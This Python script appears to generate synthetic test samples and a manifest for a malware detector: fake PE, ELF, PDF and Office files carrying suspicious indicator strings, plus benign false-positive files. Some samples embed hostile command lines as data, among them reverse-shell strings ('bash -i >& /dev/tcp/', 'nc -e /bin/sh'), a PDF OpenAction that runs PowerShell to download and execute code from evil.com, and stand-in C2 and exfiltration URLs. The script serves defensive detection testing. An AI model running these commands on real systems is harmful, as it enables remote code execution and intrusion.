#!/usr/bin/env python3
"""
Advanced test sample generator — increased complexity and volume.
Categories:
  A. Real-world attack chain simulations (multi-stage)
  B. Evasion technique combinations
  C. False positive stress test (legitimate files)
  D. Edge cases and boundary conditions
"""
import struct, hashlib, os, json, random, string

random.seed(2026)

OUTDIR = os.environ.get("OUTDIR", "tests/cross-test/samples/advanced")
os.makedirs(OUTDIR, exist_ok=True)

results = []

def save(name, data, desc, expected):
    path = os.path.join(OUTDIR, name)
    with open(path, "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode())
    sha = hashlib.sha256(data if isinstance(data, bytes) else data.encode()).hexdigest()
    results.append({"file": name, "sha256": sha, "size": len(data), "desc": desc, "expected": expected})

def make_pe_advanced(name, desc, expected, sections=None, imports=None, strings=None,
                     zero_ts=False, wx_text=False, entropy_fill=False, size=8192):
    pe = bytearray(size)
    pe[0:2] = b'MZ'
    pe[0x3C:0x40] = struct.pack('<I', 0x80)
    pe[0x80:0x84] = b'PE\x00\x00'
    pe[0x84:0x86] = struct.pack('<H', 0x8664)
    nsections = len(sections) if sections else 1
    pe[0x86:0x88] = struct.pack('<H', nsections)
    pe[0x88:0x8C] = struct.pack('<I', 0 if zero_ts else 0x65000000)
    pe[0x94:0x96] = struct.pack('<H', 0xF0)
    pe[0x96:0x98] = struct.pack('<H', 0x22)
    pe[0x98:0x9A] = struct.pack('<H', 0x20B)

    sect_off = 0x188
    for i, (sname, chars) in enumerate(sections or [(".text", 0x60000020)]):
        sn = sname.encode()[:8].ljust(8, b'\x00')
        pe[sect_off:sect_off+8] = sn
        pe[sect_off+8:sect_off+12] = struct.pack('<I', 0x1000)
        pe[sect_off+12:sect_off+16] = struct.pack('<I', 0x1000 * (i+1))
        pe[sect_off+16:sect_off+20] = struct.pack('<I', 0x1000)
        pe[sect_off+20:sect_off+24] = struct.pack('<I', 0x200 + 0x1000*i)
        if wx_text and i == 0:
            chars |= 0x80000000
        pe[sect_off+36:sect_off+40] = struct.pack('<I', chars)
        sect_off += 40

    off = 0x200
    if strings:
        for s in strings:
            enc = s.encode() + b'\x00'
            if off + len(enc) < size:
                pe[off:off+len(enc)] = enc
                off += len(enc)

    if entropy_fill:
        for i in range(off, min(off + 0x800, size)):
            pe[i] = random.randint(0, 255)

    save(name, bytes(pe), desc, expected)

print("═══ A. Real-world attack chain simulations ═══\n")

# A1. Emotet dropper simulation
make_pe_advanced("emotet_dropper.exe", "Emotet-style dropper: WinHTTP + RegSetValue + packed",
    "Malicious",
    sections=[(".text", 0x60000020), (".rsrc", 0xC0000040), (".reloc", 0x42000040)],
    strings=["WinHttpOpen", "WinHttpSendRequest", "WinHttpReceiveResponse",
             "RegSetValueExA", "CreateServiceA", "InternetOpenA",
             "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
             "cmd.exe /c", "powershell -enc"],
    wx_text=True, entropy_fill=True)

# A2. Cobalt Strike beacon simulation
make_pe_advanced("cobalt_beacon.exe", "CobaltStrike-style beacon: named pipe + process injection",
    "Malicious",
    sections=[(".text", 0x60000020), (".data", 0xC0000040)],
    strings=["CreateNamedPipeA", "ConnectNamedPipe", "VirtualAllocEx",
             "WriteProcessMemory", "CreateRemoteThread", "ResumeThread",
             "NtCreateThreadEx", "RtlCreateUserThread",
             "\\\\pipe\\\\msagent", "beacon.dll"],
    entropy_fill=True)

# A3. Ransomware simulation
make_pe_advanced("ransomware_sim.exe", "Ransomware pattern: crypto + file ops + network",
    "Malicious",
    strings=["CryptEncrypt", "CryptDecrypt", "BCryptEncrypt",
             "FindFirstFile", "FindNextFile", "MoveFileEx",
             "DeleteFileA", "WriteFile", "CreateFileA",
             ".encrypted", ".locked", "YOUR_FILES_ARE_ENCRYPTED",
             "bitcoin:", "monero:", "ransom_note.txt"],
    entropy_fill=True, wx_text=True)

# A4. Banking trojan simulation
make_pe_advanced("banking_trojan.exe", "Banking trojan: browser hook + keylogger",
    "Malicious",
    strings=["SetWindowsHookExA", "GetAsyncKeyState", "GetClipboardData",
             "InternetOpenA", "InternetConnectA", "HttpSendRequestA",
             "bank", "login", "password", "credit_card",
             "chrome.dll", "firefox.exe", "mshtml.dll"],
    entropy_fill=True)

# A5. Linux reverse shell
elf_revshell = bytearray(8192)
elf_revshell[0:4] = b'\x7fELF'
elf_revshell[4] = 2; elf_revshell[5] = 1; elf_revshell[6] = 1
elf_revshell[16:18] = struct.pack('<H', 2)
elf_revshell[18:20] = struct.pack('<H', 0x3E)
off = 512
for s in ["socket", "connect", "dup2", "execve", "/bin/sh", "/bin/bash",
           "AF_INET", "SOCK_STREAM", "/dev/tcp/", "0.0.0.0:4444",
           "nc -e /bin/sh", "bash -i >& /dev/tcp/"]:
    enc = s.encode() + b'\x00'
    elf_revshell[off:off+len(enc)] = enc
    off += len(enc)
save("linux_reverse_shell.elf", bytes(elf_revshell), "Linux reverse shell: socket+connect+dup2+execve+/dev/tcp", "Malicious")

# A6. Linux crypto miner
elf_miner = bytearray(8192)
elf_miner[0:4] = b'\x7fELF'
elf_miner[4] = 2; elf_miner[5] = 1; elf_miner[6] = 1
elf_miner[16:18] = struct.pack('<H', 2)
off = 512
for s in ["xmrig", "stratum+tcp://pool.minexmr.com:4444", "stratum+tcp://xmr.pool.minergate.com:45700",
           "--donate-level", "--threads", "RandomX", "CryptoNight",
           "hashrate", "pool.supportxmr.com", "mining"]:
    enc = s.encode() + b'\x00'
    elf_miner[off:off+len(enc)] = enc
    off += len(enc)
save("linux_crypto_miner.elf", bytes(elf_miner), "Linux cryptominer: xmrig + mining pool URLs", "Malicious")

# A7. Linux rootkit
elf_rootkit = bytearray(8192)
elf_rootkit[0:4] = b'\x7fELF'
elf_rootkit[4] = 2; elf_rootkit[5] = 1; elf_rootkit[6] = 1
elf_rootkit[16:18] = struct.pack('<H', 2)
off = 512
for s in ["rootkit", "hide_pid", "sys_call_table", "module_hide", "hide_module",
           "LD_PRELOAD", "/proc/self/maps", "getdents", "ptrace",
           "__NR_getdents64", "backdoor", "invisible"]:
    enc = s.encode() + b'\x00'
    elf_rootkit[off:off+len(enc)] = enc
    off += len(enc)
save("linux_rootkit.elf", bytes(elf_rootkit), "Linux rootkit: sys_call_table hook + hide_pid", "Malicious")

print(f"  Generated {len(results)} attack chain samples\n")
attack_count = len(results)

print("═══ B. Evasion technique combinations ═══\n")

# B1. Multi-layer evasion
make_pe_advanced("evasion_full.exe", "All evasion: VM+debug+env+timing+user+hw",
    "Suspicious",
    strings=["VMware", "VBoxService", "QEMU", "sbiedll",
             "IsDebuggerPresent", "CheckRemoteDebuggerPresent", "NtQueryInformationProcess",
             "GetComputerName", "GetUserName", "NUMBER_OF_PROCESSORS", "GetDiskFreeSpace",
             "GetTickCount", "QueryPerformanceCounter", "Sleep(",
             "GetCursorPos", "GetAsyncKeyState", "GetLastInputInfo",
             "Win32_BIOS", "Win32_DiskDrive", "HARDWARE\\DESCRIPTION\\System\\BIOS"])

# B2. Encoded/obfuscated strings
obf_data = bytearray(4096)
obf_data[0:2] = b'MZ'
obf_data[0x3C:0x40] = struct.pack('<I', 0x80)
obf_data[0x80:0x84] = b'PE\x00\x00'
obf_data[0x84:0x86] = struct.pack('<H', 0x8664)
# XOR-encoded suspicious strings (simple XOR 0x42)
off = 512
for s in ["VirtualAllocEx", "cmd.exe", "powershell"]:
    xored = bytes(b ^ 0x42 for b in s.encode())
    obf_data[off:off+len(xored)] = xored
    off += len(xored) + 1
# Also add the XOR key as evidence
obf_data[off:off+4] = b'\x42\x42\x42\x42'
for i in range(600, 4000):
    obf_data[i] = random.randint(0, 255)
save("evasion_xor_encoded.exe", bytes(obf_data), "XOR-encoded strings + high entropy", "Suspicious")

print(f"  Generated {len(results) - attack_count} evasion samples\n")
evasion_count = len(results)

print("═══ C. False positive stress test ═══\n")

# C1. Legitimate high-entropy files (should be Clean)
save("fp_compressed.gz", bytes([0x1F, 0x8B, 0x08] + [random.randint(0,255) for _ in range(4093)]),
     "Gzip compressed data (legitimate)", "Clean")

save("fp_encrypted_archive.bin", bytes([random.randint(0,255) for _ in range(8192)]),
     "Encrypted archive (pure random, no PE/ELF header)", "Clean")

# C2. Legitimate scripts with network code
save("fp_web_server.py", """#!/usr/bin/env python3
import http.server, socket, os
server = http.server.HTTPServer(('0.0.0.0', 8080), http.server.SimpleHTTPRequestHandler)
print(f"Serving on port 8080")
server.serve_forever()
""".encode(), "Legitimate Python web server", "Clean")

save("fp_ssh_config.txt", b"""Host *
    ServerAliveInterval 60
    ForwardAgent no
    IdentityFile ~/.ssh/id_rsa
""", "SSH config file (mentions .ssh but is config)", "Clean")

# C3. Legitimate PE-like files
legit_pe = bytearray(4096)
legit_pe[0:2] = b'MZ'
legit_pe[0x3C:0x40] = struct.pack('<I', 0x80)
legit_pe[0x80:0x84] = b'PE\x00\x00'
legit_pe[0x84:0x86] = struct.pack('<H', 0x8664)
legit_pe[0x86:0x88] = struct.pack('<H', 1)
legit_pe[0x88:0x8C] = struct.pack('<I', 0x65000000)  # valid timestamp
# Normal section
legit_pe[0x188:0x196] = b'.text\x00\x00\x00'
legit_pe[0x1C4:0x1C8] = struct.pack('<I', 0x60000020)
save("fp_legit_pe.exe", bytes(legit_pe), "Legitimate PE with normal characteristics", "Clean")

# C4. Documentation files
save("fp_readme.md", b"# My Project\n\nThis is a normal readme file.\n\n## Usage\n\nRun `python main.py`\n",
     "Normal markdown README", "Clean")

save("fp_config.json", json.dumps({"server": "https://api.example.com", "port": 8080, "debug": False}).encode(),
     "Normal JSON config", "Clean")

# C5. Legitimate shell script
save("fp_deploy.sh", b"""#!/bin/bash
set -euo pipefail
echo "Deploying..."
rsync -avz ./build/ user@server:/var/www/
systemctl restart nginx
echo "Done!"
""", "Legitimate deploy script", "Clean")

# C6. Empty and tiny files
save("fp_empty.txt", b"", "Empty file", "Clean")
save("fp_one_byte.bin", b"\x00", "Single null byte", "Clean")
save("fp_newline.txt", b"\n", "Single newline", "Clean")

print(f"  Generated {len(results) - evasion_count} false-positive test samples\n")
fp_count = len(results)

print("═══ D. Edge cases and boundary conditions ═══\n")

# D1. PDF with multiple exploit indicators
pdf_multi = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R/AA<</O 4 0 R>>>>endobj
2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj
3 0 obj<</Type/Action/S/JavaScript/JS(
var x = new ActiveXObject('WScript.Shell');
x.Run('cmd.exe /c powershell -enc ' + btoa('IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/payload\")'));
)>>endobj
4 0 obj<</Type/Action/S/Launch/F(cmd.exe)/P(/c calc.exe)>>endobj
5 0 obj<</Type/EmbeddedFile/Subtype/application#2Foctet-stream/Length 100>>
stream
""" + b"\x00" * 100 + b"""
endstream
endobj
xref
0 6
trailer<</Size 6/Root 1 0 R>>
startxref
0
%%EOF"""
save("pdf_multi_exploit.pdf", pdf_multi, "PDF with JS + Launch + EmbeddedFile + OpenAction + AA", "Malicious")

# D2. Office with everything
ole_kitchen_sink = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' + b'\x00' * 504
ole_kitchen_sink += b'AutoOpen\x00' * 3
ole_kitchen_sink += b'Document_Open\x00' * 2
ole_kitchen_sink += b'Shell("cmd.exe /c powershell")\x00'
ole_kitchen_sink += b'WScript.Shell\x00'
ole_kitchen_sink += b'CreateObject("XMLHTTP")\x00'
ole_kitchen_sink += b'URLDownloadToFile\x00'
ole_kitchen_sink += b'RegWrite\x00'
ole_kitchen_sink += b'DDEAUTO\x00'
ole_kitchen_sink += b'Environ("TEMP")\x00'
ole_kitchen_sink += b'Chr(80) & Chr(111) & Chr(119)\x00'  # obfuscated "Pow"
save("doc_kitchen_sink.doc", ole_kitchen_sink, "OLE2 with every macro indicator", "Malicious")

# D3. Very large PE (16KB of suspicious APIs)
big_pe = bytearray(32768)
big_pe[0:2] = b'MZ'
big_pe[0x3C:0x40] = struct.pack('<I', 0x80)
big_pe[0x80:0x84] = b'PE\x00\x00'
big_pe[0x84:0x86] = struct.pack('<H', 0x8664)
big_pe[0x86:0x88] = struct.pack('<H', 1)
big_pe[0x88:0x8C] = struct.pack('<I', 0)  # zero timestamp
big_pe[0x188:0x196] = b'.text\x00\x00\x00'
big_pe[0x1C4:0x1C8] = struct.pack('<I', 0xE0000020)  # R+W+X
off = 0x200
for api in ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
            "NtCreateThread", "RtlCreateUserThread", "VirtualProtect",
            "InternetOpenA", "InternetConnectA", "HttpOpenRequestA",
            "URLDownloadToFile", "WinHttpOpen", "WinHttpSendRequest",
            "RegSetValueExA", "RegCreateKeyExA", "CreateServiceA",
            "CryptEncrypt", "CryptDecrypt", "BCryptEncrypt",
            "IsDebuggerPresent", "CheckRemoteDebuggerPresent",
            "SetWindowsHookExA", "GetAsyncKeyState",
            "cmd.exe", "powershell.exe", "wscript.exe", "mshta.exe"]:
    enc = api.encode() + b'\x00'
    big_pe[off:off+len(enc)] = enc
    off += len(enc)
for i in range(off, 32000):
    big_pe[i] = random.randint(0, 255)
save("pe_mega_suspicious.exe", bytes(big_pe), "PE with 26 suspicious APIs + W+X + zero timestamp + high entropy", "Malicious")

# D4. Binary with URLs from threat intel
url_binary = bytearray(4096)
off = 0
for url in [
    b"http://192.168.1.100:4444/shell",
    b"https://bit.ly/m4lw4r3",
    b"http://evil.tk/dropper.exe",
    b"http://malware.xyz/payload",
    b"https://t.co/abcdef",
    b"http://10.0.0.1:8080/c2",
    b"ftp://attacker.ga/exfil",
]:
    url_binary[off:off+len(url)] = url
    off += len(url) + 1
save("urls_multi_ioc.bin", bytes(url_binary), "Binary with multiple suspicious URLs", "Suspicious")

# D5. Polyglot file (PE header + PDF content)
polyglot = bytearray(8192)
polyglot[0:2] = b'MZ'
polyglot[0x3C:0x40] = struct.pack('<I', 0x80)
polyglot[0x80:0x84] = b'PE\x00\x00'
polyglot[0x84:0x86] = struct.pack('<H', 0x8664)
# Embed PDF with JS at offset 0x200
pdf_part = b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n2 0 obj<</S/JavaScript/JS(app.alert(1))>>endobj\n"
polyglot[0x200:0x200+len(pdf_part)] = pdf_part
save("polyglot_pe_pdf.bin", bytes(polyglot), "PE/PDF polyglot with embedded JS", "Suspicious")

print(f"  Generated {len(results) - fp_count} edge case samples\n")

# ═══ Summary ═══
total = len(results)
expected_mal = sum(1 for r in results if r["expected"] == "Malicious")
expected_sus = sum(1 for r in results if r["expected"] == "Suspicious")
expected_cln = sum(1 for r in results if r["expected"] == "Clean")

print(f"═══ TOTAL: {total} samples ═══")
print(f"  Expected Malicious:  {expected_mal}")
print(f"  Expected Suspicious: {expected_sus}")
print(f"  Expected Clean:      {expected_cln}")

with open(os.path.join(OUTDIR, "manifest.json"), "w") as f:
    json.dump(results, f, indent=2)
